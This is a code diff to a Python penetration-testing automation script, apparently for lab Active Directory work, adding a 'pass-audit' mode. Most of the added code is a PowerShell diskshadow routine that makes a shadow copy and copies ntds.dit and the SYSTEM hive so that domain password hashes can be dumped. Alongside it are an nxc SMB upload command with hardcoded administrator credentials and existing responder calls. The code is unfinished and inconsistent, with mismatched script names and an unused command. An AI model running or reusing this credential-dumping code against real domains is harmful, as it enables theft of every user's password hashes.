@@ -379,6 +379,54 @@ def responder_run(jh, config_file=None):
         # start responder
         command = 'sudo responder -Pv -I '+ifp[0]
         start_resp = run_ssh_command(jh, f"tmux new-session -d -s 'responder' '{command}'")
+
+
+
+
+
+
+def pas_audit():
+    powershell_code = r'''
+$DiskshadowScript = @"
+set context persistent nowriters
+set metadata C:\Windows\Temp\meta.cab
+set verbose on
+add volume c: alias temp
+create
+expose %temp% z:
+exec "cop.cmd"
+delete shadows volume %temp%
+reset
+"@ -replace "`n", "`r`n"  # Force CR+LF line endings
+    
+# create temp directory
+    
+# Write diskshadow script to temp file
+$ScriptPath = "C:\Windows\Temp\ds.txt"
+$DiskshadowScript | Out-File -FilePath $ScriptPath -Encoding ASCII
+    
+$outputFile = "diskshadow_output.txt"
+    
+echo 'copy z:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit' | out-file ./cop.cmd -encoding ascii
+echo 'copy z:\Windows\System32\config\SYSTEM C:\Windows\Temp\copy-system.hive' | out-file ./cop.cmd -encoding ascii -append
+echo 'reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive"' | out-file ./cop.cmd -encoding ascii -append
+    
+# Run DiskShadow with script and capture output
+diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
+'''
+
+    with open(f'audit.ps1', 'w') as f:
+            f.write(powershell_code)
+            
+    print(powershell_code)
+    command1 = "nxc smb 192.168.122.99 -u 'Administrator' -p 'Password1!' --put-file trial.ps1 \\\\Windows\\\\Temp\\\\trial.ps1"
+
+    
+
+
+
+
+    None
     
 def main():
     parser = argparse.ArgumentParser(description="Run nmap scan in tmux on remote host")
@@ -414,6 +462,13 @@ def main():
     responder_parser.add_argument("-jumphost", "-jh", required=True, help="SSH host to run the command from")
     responder_parser.add_argument("--config_file", "-c", help="Path to YAML configuration file")
 
+    pasaudit_parser = subparsers.add_parser("pass-audit", help="This will grab ntds.dit file, all enabled usersl, all high priv users, and dump the ntds.dit.")
+    pasaudit_parser.add_argument("-jumphost", "-jh", required=False, help="SSH jumphost to run the command from, if there is one.")
+    pasaudit_parser.add_argument("-dc-ip", "-dc", required=True, help="Target DC or AD machine IP")
+    pasaudit_parser.add_argument("-user", "-u", required=True, help="Active Directory user. Example: admin@marvel.local")
+    pasaudit_parser.add_argument("-password", "-p", required=True, help="Ehm Password of that user?")
+    pasaudit_parser.add_argument("-domain", "-d", required=True, help="target domain. Example: marvel.local")
+    
     parse_parser = subparsers.add_parser("parse", help="Parse nmap output.")
     parse_parser.add_argument("--nmap-output", "-n", required=True, help="Path to nmap output directory or file.")
 
@@ -458,6 +513,10 @@ def main():
             responder_run(args.jumphost, config)
         else:
             responder_run(args.jumphost)
+
+    if args.mode == 'pass-audit':
+        pas_audit()
+        print('yes its password audit')
 
     if args.mode == 'parse' :
         print('Hello')
